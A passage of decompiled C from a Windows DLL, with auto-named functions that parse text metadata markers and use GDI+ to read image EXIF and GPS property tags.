  sub_1000D3AD((int *)v14);
  LOBYTE(v26) = 0;
  sub_1000D3AD(v13);
  sub_1000D372(v18, (int)&unk_10186C2C);
  LOBYTE(v26) = 5;
  sub_1000D372(&v19, (int)&unk_10186C5C);
  LOBYTE(v26) = 6;
  sub_1000D372(&v20, (int)&unk_10186C4C);
  LOBYTE(v26) = 7;
  sub_1000D372(&v21, (int)&unk_10186C34);
  LOBYTE(v26) = 8;
  sub_1000D372(&v22, (int)&unk_10186C54);
  LOBYTE(v26) = 9;
  sub_1000D372(&v23, (int)&unk_10186C44);
  LOBYTE(v26) = 10;
  sub_1000D372(&v24, (int)&unk_10186C24);
  LOBYTE(v26) = 11;
  sub_1000D372(v25, (int)&unk_10186C3C);
  LOBYTE(v26) = 13;
  v13[0] = 0;
  for ( i = v18; ; i += 2 )
  {
    v8 = sub_1000DF75((int)&v15, (int)i, 0);
    if ( v8 != -1 )
      break;
LABEL_7:
    if ( ++v13[0] >= 8u )
    {
      LOBYTE(v26) = 0;
      `eh vector destructor iterator'(v18, 8u, 8, (void (__thiscall *)(void *))sub_1000D3AD);
      v26 = -1;
      sub_1000D3AD(&v15);
      return 0;
    }
  }
  v12 = v7;
  v11 = v7;
  v14[0] = &v11;
  sub_1000D372(&v11, (int)&v15);
  LOBYTE(v26) = 13;
  v9 = sub_1003B486(v8, v11, v12);
  if ( v9 != -1 )
  {
    sub_1000D836(v9 - *(_DWORD *)(i[1] + 28) - v8 + 1, (int)&v15, v17, v8 + *(_DWORD *)(i[1] + 28));
    LOBYTE(v26) = 15;
    (*(void (__thiscall **)(int, _DWORD *, int *))(*(_DWORD *)a2 + 24))(a2, i, v17);
    LOBYTE(v26) = 13;
    sub_1000D3AD(v17);
    goto LABEL_7;
  }
  LOBYTE(v26) = 0;
  `eh vector destructor iterator'(v18, 8u, 8, (void (__thiscall *)(void *))sub_1000D3AD);
  v26 = -1;
  sub_1000D3AD(&v15);
  return 2;
}
// 1003B389: variable 'v7' is possibly undefined
// 10186BFC: using guessed type int dword_10186BFC;
// 1003B15A: using guessed type _DWORD var_50[2];
// 1003B15A: using guessed type int var_18[3];

//----- (1003B486) --------------------------------------------------------
int __stdcall sub_1003B486(unsigned int a1, int a2, int a3)
{
  int i; // eax
  int v4; // ecx
  int v5; // ebx
  __int16 v7; // cx
  int v8; // [esp+10h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+20h] [ebp-4h]
  __int16 v11; // [esp+2Ch] [ebp+8h]

  v10 = 0;
  sub_1000D17D(&v8, asc_10175EF4);
  LOBYTE(v10) = 1;
  for ( i = sub_1000DF75((int)&a2, (int)&v8, a1); ; i = sub_1000DF75((int)&a2, (int)&v8, v5 + 1) )
  {
    v5 = i;
    LOBYTE(v10) = 0;
    sub_1000D3AD(&v8);
    if ( v5 <= 0 || *(_WORD *)sub_1000D52B(v4, v5 - 1, &a2) != 92 )
      break;
    sub_1000D17D(&v8, asc_10175EF8);
    LOBYTE(v10) = 2;
  }
  if ( (unsigned int)(v5 + 1) >= *(_DWORD *)(a3 + 28) )
    v9 = 0;
  else
    v9 = *(unsigned __int16 *)sub_1000D52B(v4, v5 + 1, &a2);
  if ( (unsigned int)(v5 + 2) >= *(_DWORD *)(a3 + 28) )
    v11 = 0;
  else
    v11 = *(_WORD *)sub_1000D52B(v4, v5 + 2, &a2);
  if ( (unsigned int)(v5 + 3) >= *(_DWORD *)(a3 + 28) )
    v7 = 0;
  else
    v7 = *(_WORD *)sub_1000D52B(v4, v5 + 3, &a2);
  if ( (_WORD)v9 == 47
    || (_WORD)v9 == 32 && v11 == 47
    || (_WORD)v9 == 62 && v11 == 62
    || (_WORD)v9 == 32 && v11 == 62 && v7 == 62 )
  {
    v10 = -1;
    sub_1000D3AD(&a2);
    return v5;
  }
  else
  {
    v10 = -1;
    sub_1000D3AD(&a2);
    return -1;
  }
}
// 1003B4C1: conditional instruction was optimized away because ebx.4>=1
// 1003B4B3: variable 'v4' is possibly undefined

//----- (1003B5BB) --------------------------------------------------------
void __userpurge sub_1003B5BB(int a1@<edi>, int a2)
{
  int v2; // eax
  int v3; // ebx
  char v4; // al
  char *v5; // ecx
  int v6; // ebx
  char v7; // al
  int v8; // ebx
  char v9; // al
  int v10; // ebx
  char v11; // al
  int v12; // ebx
  char v13; // al
  int v14; // ebx
  char v15; // al
  int v16; // ebx
  char v17; // al
  int v18; // ebx
  char v19; // al
  int v20; // ecx
  char v21; // [esp+0h] [ebp-D4h]
  int v22[2]; // [esp+14h] [ebp-C0h] BYREF
  void *v23[2]; // [esp+1Ch] [ebp-B8h] BYREF
  char v24; // [esp+24h] [ebp-B0h] BYREF
  char v25[16]; // [esp+28h] [ebp-ACh] BYREF
  char v26; // [esp+38h] [ebp-9Ch] BYREF
  char v27[16]; // [esp+3Ch] [ebp-98h] BYREF
  char v28; // [esp+4Ch] [ebp-88h] BYREF
  char v29[16]; // [esp+50h] [ebp-84h] BYREF
  char v30; // [esp+60h] [ebp-74h] BYREF
  char v31[16]; // [esp+64h] [ebp-70h] BYREF
  char v32; // [esp+74h] [ebp-60h] BYREF
  char v33[16]; // [esp+78h] [ebp-5Ch] BYREF
  char v34; // [esp+88h] [ebp-4Ch] BYREF
  char v35[16]; // [esp+8Ch] [ebp-48h] BYREF
  char v36; // [esp+9Ch] [ebp-38h] BYREF
  char v37[16]; // [esp+A0h] [ebp-34h] BYREF
  char v38; // [esp+B0h] [ebp-24h] BYREF
  char v39[20]; // [esp+B4h] [ebp-20h] BYREF
  int v40; // [esp+D0h] [ebp-4h]
  char vars0; // [esp+D4h] [ebp+0h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 36))(a1, v23);
  v40 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v23[0] + 4))(v23[0]) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v23[0] + 12))(v23[0]);
    sub_1000D372(v22, v2);
    LOBYTE(v40) = 1;
    if ( sub_1000DE70((int)v22, (int)&unk_10186C4C) && (*(_BYTE *)(a2 + 40) & 2) != 0 )
    {
      v3 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v4 = sub_1000B261(v3, (int)v37, v21);
      vars0 = 2;
      v21 = v4;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v36;
LABEL_26:
      sub_1000B3DF((int *)v5);
      goto LABEL_27;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C5C) && (*(_BYTE *)(a2 + 40) & 8) != 0 )
    {
      v6 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v7 = sub_1000B261(v6, (int)v29, v21);
      vars0 = 3;
      v21 = v7;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v28;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C2C) && (*(_BYTE *)(a2 + 40) & 0x10) != 0 )
    {
      v8 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v9 = sub_1000B261(v8, (int)v25, v21);
      vars0 = 4;
      v21 = v9;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v24;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C24) && (*(_BYTE *)(a2 + 40) & 0x20) != 0 )
    {
      v10 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v11 = sub_1000B261(v10, (int)v33, v21);
      vars0 = 5;
      v21 = v11;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v32;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C3C) && (*(_BYTE *)(a2 + 40) & 4) != 0 )
    {
      v12 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v13 = sub_1000B261(v12, (int)v27, v21);
      vars0 = 6;
      v21 = v13;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v26;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C34) && (*(_BYTE *)(a2 + 40) & 0x40) != 0 )
    {
      v14 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v15 = sub_1000B261(v14, (int)v31, v21);
      vars0 = 7;
      v21 = v15;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v30;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C54) && *(char *)(a2 + 40) < 0 )
    {
      v16 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v17 = sub_1000B261(v16, (int)v35, v21);
      vars0 = 8;
      v21 = v17;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v34;
      goto LABEL_26;
    }
    if ( sub_1000DE70((int)v22, (int)&unk_10186C44) && (*(_WORD *)(a2 + 40) & 0x100) != 0 )
    {
      v18 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)a1 + 20))(a1, v22, 0);
      v19 = sub_1000B261(v18, (int)v39, v21);
      vars0 = 9;
      v21 = v19;
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)(a2 + 4) + 24))(a2 + 4, v22);
      LOBYTE(v40) = 1;
      v5 = &v38;
      goto LABEL_26;
    }
LABEL_27:
    LOBYTE(v40) = 0;
    sub_1000D3AD(v22);
    sub_10021F56(v20, (int)v23[0]);
  }
  v40 = -1;
  sub_10007D7A(v23);
}
// 1003B65A: variable 'v21' is possibly undefined
// 1003B940: variable 'v20' is possibly undefined
// 1003B5BB: using guessed type char var_48[16];
// 1003B5BB: using guessed type char var_98[16];
// 1003B5BB: using guessed type char var_70[16];
// 1003B5BB: using guessed type char var_AC[16];
// 1003B5BB: using guessed type char var_84[16];
// 1003B5BB: using guessed type char var_5C[16];
// 1003B5BB: using guessed type char var_34[16];
// 1003B5BB: using guessed type char var_20[20];

//----- (1003B97E) --------------------------------------------------------
char __stdcall sub_1003B97E(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // ebx
  unsigned int v7; // esi
  int v8; // eax
  int v9; // ecx
  char v10; // cl
  _DWORD *v11; // eax
  _BYTE *v12; // ecx
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  int v16[5]; // [esp+10h] [ebp-54h] BYREF
  int v17[5]; // [esp+24h] [ebp-40h] BYREF
  int v18[2]; // [esp+38h] [ebp-2Ch] BYREF
  int v19; // [esp+40h] [ebp-24h] BYREF
  LONG v20; // [esp+44h] [ebp-20h] BYREF
  unsigned int v21; // [esp+48h] [ebp-1Ch]
  unsigned int v22; // [esp+4Ch] [ebp-18h]
  char v23; // [esp+53h] [ebp-11h]
  int v24; // [esp+60h] [ebp-4h]

  v6 = 0;
  v24 = 0;
  v7 = 0;
  v23 = 0;
  sub_1000D17D(&v19, &word_10175EFC);
  LOBYTE(v24) = 1;
  sub_10001236(&v20, (LONG *)(a6 + 4));
  LOBYTE(v24) = 0;
  sub_1000D3AD(&v19);
  LOBYTE(v24) = 2;
LABEL_2:
  v8 = a4;
  while ( v7 < v8 - 1 )
  {
    v9 = a3 + *(_DWORD *)(a2 + 12);
    if ( v23 )
    {
      if ( *(_BYTE *)(v9 + v7) == 41 )
      {
        v10 = *(_BYTE *)(v9 + v7 + 1);
        if ( v10 == 47 || v10 == 62 )
        {
          v23 = 0;
          sub_1000B67C(&a1, (int)v17, v6, v7 - v6);
          LOBYTE(v24) = 3;
          v11 = sub_1000CCFC(&v19);
          LOBYTE(v24) = 4;
          sub_1000D575(a6, v11);
          LOBYTE(v24) = 3;
          sub_1000D3AD(&v19);
          LOBYTE(v24) = 2;
          sub_1000B3DF(v17);
          v6 = v7;
          v21 = v7;
          v8 = a4;
        }
      }
    }
    else
    {
      v12 = (_BYTE *)(v7 + v9);
      if ( *v12 == 0xFE && v12[1] == 0xFF )
      {
        v23 = 1;
        sub_1000B67C(&a1, (int)v16, v6, v7 - v6);
        LOBYTE(v24) = 5;
        v13 = sub_1000D2FA(v18, 0);
        LOBYTE(v24) = 6;
        sub_1000D575(a6, v13);
        LOBYTE(v24) = 5;
        sub_1000D3AD(v18);
        LOBYTE(v24) = 2;
        sub_1000B3DF(v16);
        v7 += 2;
        v22 = v7;
        v6 = v7;
        v21 = v7;
        goto LABEL_2;
      }
    }
    v22 = ++v7;
  }
  sub_1000B67C(&a1, (int)v16, v6, v8 - v6);
  LOBYTE(v24) = 7;
  v14 = sub_1000D2FA(v18, 0);
  LOBYTE(v24) = 8;
  sub_1000D575(a6, v14);
  LOBYTE(v24) = 7;
  sub_1000D3AD(v18);
  LOBYTE(v24) = 2;
  sub_1000B3DF(v16);
  v24 = -1;
  sub_1000B3DF(&a1);
  return 1;
}
// 1003B97E: using guessed type int var_40[5];
// 1003B97E: using guessed type int var_54[5];

//----- (1003BB34) --------------------------------------------------------
_DWORD *__stdcall sub_1003BB34(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_10103974;
  sub_10018FD5(a1 + 1, 0x10u);
  sub_10018FD5(a1 + 5, 0x10u);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103974: using guessed type int (__thiscall *off_10103974)(void *Block, char);

//----- (1003BB7E) --------------------------------------------------------
int __cdecl sub_1003BB7E(int a1)
{
  return GdipFree(a1);
}
// 1009E745: using guessed type int __stdcall GdipFree(_DWORD);

//----- (1003BB88) --------------------------------------------------------
_DWORD *__thiscall sub_1003BB88(_DWORD *this, char a2)
{
  int v4; // [esp-4h] [ebp-8h]

  v4 = this[1];
  *this = &off_10103C98;
  GdipDisposeImage(v4);
  if ( (a2 & 1) != 0 )
    GdipFree(this);
  return this;
}
// 1009E745: using guessed type int __stdcall GdipFree(_DWORD);
// 1009E785: using guessed type int __stdcall GdipDisposeImage(_DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);

//----- (1003BBBB) --------------------------------------------------------
_DWORD *__thiscall sub_1003BBBB(_DWORD *this)
{
  int v2; // eax
  _DWORD *result; // eax
  int v4; // esi
  int v5; // ecx
  int v6[4]; // [esp+14h] [ebp-10h] BYREF

  v6[0] = 0;
  v2 = GdipCloneImage(this[1], v6);
  if ( v2 )
    this[2] = v2;
  result = (_DWORD *)GdipAlloc(16);
  v6[3] = 0;
  if ( !result )
    return 0;
  v4 = this[2];
  v5 = v6[0];
  *result = &off_10103C98;
  result[1] = v5;
  result[2] = v4;
  return result;
}
// 1009E735: using guessed type int __stdcall GdipCloneImage(_DWORD, _DWORD);
// 1009E755: using guessed type int __stdcall GdipAlloc(_DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);

//----- (1003BC12) --------------------------------------------------------
void __thiscall sub_1003BC12(Concurrency::details::UMSFreeThreadProxyFactory *this)
{
  *(_DWORD *)this = &off_10103CA0;
  sub_10040543((_DWORD *)this + 14);
  Concurrency::details::UMSFreeThreadProxyFactory::~UMSFreeThreadProxyFactory(this);
}
// 10103CA0: using guessed type int (__thiscall *off_10103CA0)(void *Block, char);

//----- (1003BC46) --------------------------------------------------------
int sub_1003BC46()
{
  return 1;
}

//----- (1003BC4A) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__thiscall sub_1003BC4A(
        Concurrency::details::UMSFreeThreadProxyFactory *Block,
        char a2)
{
  sub_1003BC12(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003BC66) --------------------------------------------------------
Concurrency::details::UMSFreeThreadProxyFactory *__stdcall sub_1003BC66(
        Concurrency::details::UMSFreeThreadProxyFactory *a1,
        int a2,
        __int16 a3)
{
  int v4[9]; // [esp+0h] [ebp-28h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v4[6] = (int)v4;
  sub_1000D372(v4, a2);
  v5 = -1;
  sub_1004AF1C((int)a1, a3, v4[0], v4[1]);
  v5 = 1;
  *(_DWORD *)a1 = &off_10103CA0;
  sub_1004046F((_DWORD *)a1 + 14);
  return a1;
}
// 10103CA0: using guessed type int (__thiscall *off_10103CA0)(void *Block, char);

//----- (1003BCB9) --------------------------------------------------------
int __stdcall sub_1003BCB9(int a1, int a2)
{
  int PropertySize; // eax
  void *v4; // esi
  _DWORD *v5; // eax
  int AllPropertyItems; // eax
  int v7; // esi
  char *v8; // ebx
  int v9; // esi
  int v10; // eax
  char *v11; // ecx
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // [esp-8h] [ebp-154h]
  unsigned int v22; // [esp+14h] [ebp-138h] BYREF
  int *v23; // [esp+18h] [ebp-134h]
  unsigned int v24; // [esp+1Ch] [ebp-130h]
  size_t Size; // [esp+20h] [ebp-12Ch] BYREF
  unsigned int v26; // [esp+24h] [ebp-128h]
  char *v27; // [esp+28h] [ebp-124h]
  int v28; // [esp+2Ch] [ebp-120h]
  void *v29; // [esp+30h] [ebp-11Ch]
  int (__stdcall **v30)(char); // [esp+34h] [ebp-118h]
  int v31; // [esp+38h] [ebp-114h] BYREF
  int v32; // [esp+3Ch] [ebp-110h]
  void *Block; // [esp+44h] [ebp-108h] BYREF
  int v34; // [esp+48h] [ebp-104h] BYREF
  int v35; // [esp+4Ch] [ebp-100h] BYREF
  int v36; // [esp+50h] [ebp-FCh] BYREF
  int v37; // [esp+54h] [ebp-F8h] BYREF
  int v38; // [esp+58h] [ebp-F4h] BYREF
  int v39; // [esp+5Ch] [ebp-F0h] BYREF
  int v40; // [esp+60h] [ebp-ECh] BYREF
  int v41; // [esp+64h] [ebp-E8h] BYREF
  int v42; // [esp+68h] [ebp-E4h] BYREF
  void *v43[2]; // [esp+6Ch] [ebp-E0h] BYREF
  char v44[20]; // [esp+74h] [ebp-D8h] BYREF
  char v45[20]; // [esp+88h] [ebp-C4h] BYREF
  char v46[20]; // [esp+9Ch] [ebp-B0h] BYREF
  int v47[5]; // [esp+B0h] [ebp-9Ch] BYREF
  int v48[5]; // [esp+C4h] [ebp-88h] BYREF
  int v49[5]; // [esp+D8h] [ebp-74h] BYREF
  int v50[5]; // [esp+ECh] [ebp-60h] BYREF
  int v51[5]; // [esp+100h] [ebp-4Ch] BYREF
  int v52[5]; // [esp+114h] [ebp-38h] BYREF
  int v53[6]; // [esp+128h] [ebp-24h] BYREF
  int v54; // [esp+148h] [ebp-4h]

  v21 = *(_DWORD *)(*(_DWORD *)(a1 + 52) + 12);
  v30 = &off_10103C98;
  v31 = 0;
  v32 = GdipLoadImageFromFile(v21, &v31);
  v54 = 0;
  Size = 0;
  v22 = 0;
  PropertySize = GdipGetPropertySize(v31, &Size, &v22);
  if ( PropertySize )
    v32 = PropertySize;
  else
    PropertySize = 0;
  if ( PropertySize )
  {
    v54 = -1;
    v30 = &off_10103C98;
    GdipDisposeImage(v31);
    return 200;
  }
  v4 = operator new(Size);
  v5 = operator new(4u);
  Block = v5;
  LOBYTE(v54) = 1;
  if ( v5 )
    *v5 = 1;
  else
    v5 = 0;
  v43[1] = v5;
  v43[0] = v4;
  LOBYTE(v54) = 2;
  if ( v4 )
  {
    AllPropertyItems = GdipGetAllPropertyItems(v31, Size, v22, v4);
    if ( AllPropertyItems )
      v32 = AllPropertyItems;
    else
      AllPropertyItems = 0;
    if ( AllPropertyItems )
      goto LABEL_15;
    v24 = 0;
    if ( !v22 )
    {
LABEL_55:
      v7 = 0;
      goto LABEL_16;
    }
    v23 = (int *)v4;
    while ( 1 )
    {
      if ( !(_WORD)a2 )
        goto LABEL_55;
      v26 = *v23;
      v27 = (char *)v23[1];
      v28 = v23[2];
      v29 = (void *)v23[3];
      v8 = v27;
      if ( (_WORD)v28 == 2 )
        v8 = v27 - 1;
      if ( v26 > 6 )
      {
        switch ( v26 )
        {
          case 0x10Fu:
            if ( (a2 & 4) != 0 )
            {
              Block = (void *)4;
              v20 = sub_1000B1F3(v8, (int)v53, v29);
              LOBYTE(v54) = 4;
              (*(void (__thiscall **)(int, void **, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &Block, v20);
              LOBYTE(v54) = 2;
              sub_1000B3DF(v53);
              a2 ^= 4u;
            }
            break;
          case 0x110u:
            if ( (a2 & 2) != 0 )
            {
              v35 = 2;
              v19 = sub_1000B1F3(v8, (int)v51, v29);
              LOBYTE(v54) = 3;
              (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v35, v19);
              LOBYTE(v54) = 2;
              sub_1000B3DF(v51);
              a2 ^= 2u;
            }
            break;
          case 0x9003u:
            if ( (a2 & 0x10) != 0 )
            {
              v39 = 16;
              v18 = sub_1000B1F3(v8, (int)v49, v29);
              LOBYTE(v54) = 6;
              (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v39, v18);
              LOBYTE(v54) = 2;
              sub_1000B3DF(v49);
              a2 ^= 0x10u;
            }
            break;
          default:
            if ( v26 == 36868 && (a2 & 8) != 0 )
            {
              v38 = 8;
              v17 = sub_1000B1F3(v8, (int)v47, v29);
              LOBYTE(v54) = 5;
              (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v38, v17);
              LOBYTE(v54) = 2;
              sub_1000B3DF(v47);
              a2 ^= 8u;
            }
            break;
        }
        goto LABEL_54;
      }
      switch ( v26 )
      {
        case 6u:
          v9 = 1024;
          if ( (a2 & 0x400) == 0 )
            goto LABEL_54;
          v40 = 1024;
          v16 = sub_1000B1F3(v8, (int)v45, v29);
          LOBYTE(v54) = 12;
          (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v40, v16);
          LOBYTE(v54) = 2;
          v11 = v45;
          goto LABEL_33;
        case 1u:
          if ( (a2 & 0x20) != 0 )
          {
            v36 = 32;
            v15 = sub_1000B1F3(v8, (int)v52, v29);
            LOBYTE(v54) = 7;
            (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v36, v15);
            LOBYTE(v54) = 2;
            sub_1000B3DF(v52);
            a2 ^= 0x20u;
          }
          goto LABEL_54;
        case 2u:
          if ( (a2 & 0x40) != 0 )
          {
            v41 = 64;
            v14 = sub_1000B1F3(v8, (int)v48, v29);
            LOBYTE(v54) = 8;
            (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v41, v14);
            LOBYTE(v54) = 2;
            sub_1000B3DF(v48);
            a2 ^= 0x40u;
          }
          goto LABEL_54;
        case 3u:
          if ( (a2 & 0x80u) != 0 )
          {
            v34 = 128;
            v13 = sub_1000B1F3(v8, (int)v50, v29);
            LOBYTE(v54) = 9;
            (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v34, v13);
            LOBYTE(v54) = 2;
            sub_1000B3DF(v50);
            a2 ^= 0x80u;
          }
          goto LABEL_54;
      }
      if ( v26 != 4 )
        break;
      v9 = 256;
      if ( (a2 & 0x100) != 0 )
      {
        v42 = 256;
        v12 = sub_1000B1F3(v8, (int)v46, v29);
        LOBYTE(v54) = 10;
        (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v42, v12);
        LOBYTE(v54) = 2;
        v11 = v46;
LABEL_33:
        sub_1000B3DF((int *)v11);
        a2 ^= v9;
      }
LABEL_54:
      ++v24;
      v23 += 4;
      if ( v24 >= v22 )
        goto LABEL_55;
    }
    if ( v26 != 5 )
      goto LABEL_54;
    v9 = 512;
    if ( (a2 & 0x200) == 0 )
      goto LABEL_54;
    v37 = 512;
    v10 = sub_1000B1F3(v8, (int)v44, v29);
    LOBYTE(v54) = 11;
    (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)(a1 + 4) + 24))(a1 + 4, &v37, v10);
    LOBYTE(v54) = 2;
    v11 = v44;
    goto LABEL_33;
  }
  v32 = 2;
LABEL_15:
  v7 = 200;
LABEL_16:
  LOBYTE(v54) = 0;
  sub_100403FE(v43);
  v54 = -1;
  v30 = &off_10103C98;
  GdipDisposeImage(v31);
  return v7;
}
// 1009E765: using guessed type int __stdcall GdipGetAllPropertyItems(_DWORD, _DWORD, _DWORD, _DWORD);
// 1009E775: using guessed type int __stdcall GdipLoadImageFromFile(_DWORD, _DWORD);
// 1009E785: using guessed type int __stdcall GdipDisposeImage(_DWORD);
// 1009E795: using guessed type int __stdcall GdipGetPropertySize(_DWORD, _DWORD, _DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);
// 1003BCB9: using guessed type int var_60[5];
// 1003BCB9: using guessed type int var_88[5];
// 1003BCB9: using guessed type int var_38[5];
// 1003BCB9: using guessed type int var_9C[5];
// 1003BCB9: using guessed type int var_74[5];
// 1003BCB9: using guessed type int var_4C[5];
// 1003BCB9: using guessed type int var_24[6];

//----- (1003C213) --------------------------------------------------------
int __thiscall sub_1003C213(unsigned __int16 *this)
{
  return sub_1003BCB9((int)this, this[20]);
}

//----- (1003C21F) --------------------------------------------------------
int __usercall sub_1003C21F@<eax>(int result@<eax>, int a2@<ecx>)
{
  int v2; // ecx

  *(_DWORD *)(result + 16) = a2;
  v2 = a2 - 1;
  *(_DWORD *)result = off_10103CC0;
  *(_WORD *)(result + 4) = 0;
  *(_DWORD *)(result + 8) = 0;
  *(_DWORD *)(result + 12) = 0;
  if ( v2 )
  {
    if ( v2 == 1 )
    {
      *(_DWORD *)(result + 8) = &unk_100FBEE0;
      *(_DWORD *)(result + 12) = &unk_100FF884;
      *(_WORD *)(result + 4) = 2;
    }
  }
  else
  {
    *(_DWORD *)(result + 8) = &unk_100FBED0;
    *(_DWORD *)(result + 12) = &unk_100FF85C;
    *(_WORD *)(result + 4) = 5;
  }
  return result;
}
// 10103CC0: using guessed type int (__thiscall *off_10103CC0[2])(void *Block, char);

//----- (1003C281) --------------------------------------------------------
_DWORD *__cdecl sub_1003C281(_DWORD *a1, int a2)
{
  wchar_t *v2; // eax
  char *v3; // eax

  if ( *(_WORD *)a2 == 30 )
  {
    v3 = *(char **)(a2 + 8);
    if ( !v3 )
      v3 = (char *)&unk_1013335F;
    sub_1000D3EB(a1, v3);
  }
  else if ( *(_WORD *)a2 == 31 )
  {
    v2 = *(wchar_t **)(a2 + 8);
    if ( !v2 )
      v2 = (wchar_t *)&unk_10175BF0;
    sub_1000D17D(a1, v2);
  }
  else
  {
    sub_1000D17D(a1, &word_10175BF4);
  }
  return a1;
}

//----- (1003C2E6) --------------------------------------------------------
int __userpurge sub_1003C2E6@<eax>(int a1@<ecx>, int a2@<edi>, int a3)
{
  __int32 v4; // eax
  int v5; // esi
  bool v7; // zf
  _DWORD *v8; // eax
  int v9; // eax
  int v10; // eax
  char *v11; // ecx
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  __int32 v19; // eax
  PROPVARIANT rgvars[10]; // [esp+10h] [ebp-17Ch] BYREF
  char v21[20]; // [esp+B4h] [ebp-D8h] BYREF
  char v22[20]; // [esp+C8h] [ebp-C4h] BYREF
  char v23[20]; // [esp+DCh] [ebp-B0h] BYREF
  char v24[20]; // [esp+F0h] [ebp-9Ch] BYREF
  char v25[20]; // [esp+104h] [ebp-88h] BYREF
  char v26[20]; // [esp+118h] [ebp-74h] BYREF
  char v27[20]; // [esp+12Ch] [ebp-60h] BYREF
  int v28[2]; // [esp+140h] [ebp-4Ch] BYREF
  int v29; // [esp+148h] [ebp-44h] BYREF
  int v30; // [esp+14Ch] [ebp-40h] BYREF
  int v31; // [esp+150h] [ebp-3Ch] BYREF
  int v32; // [esp+154h] [ebp-38h] BYREF
  int v33; // [esp+158h] [ebp-34h] BYREF
  int v34; // [esp+15Ch] [ebp-30h] BYREF
  int v35; // [esp+160h] [ebp-2Ch] BYREF
  int v36; // [esp+164h] [ebp-28h]
  PROPVARIANT *v37; // [esp+168h] [ebp-24h]
  int v38; // [esp+16Ch] [ebp-20h] BYREF
  LONG v39; // [esp+170h] [ebp-1Ch] BYREF
  int v40; // [esp+174h] [ebp-18h]
  int v41[4]; // [esp+178h] [ebp-14h] BYREF
  int v42; // [esp+188h] [ebp-4h]

  v42 = 2;
  v41[0] = 0;
  v4 = (*(int (__stdcall **)(int, _DWORD, int, int *))(*(_DWORD *)a3 + 16))(a3, *(_DWORD *)(a2 + 8), 16, v41);
  if ( v4 )
  {
    v5 = sub_1003C676(v4, v4);
    goto LABEL_3;
  }
  if ( !v41[0] )
  {
    v5 = 103 - (*(_DWORD *)(a2 + 16) != 1);
    goto LABEL_3;
  }
  sub_1000D17D(&v38, &word_10175BF8);
  LOBYTE(v42) = 5;
  memset(rgvars, 0, sizeof(rgvars));
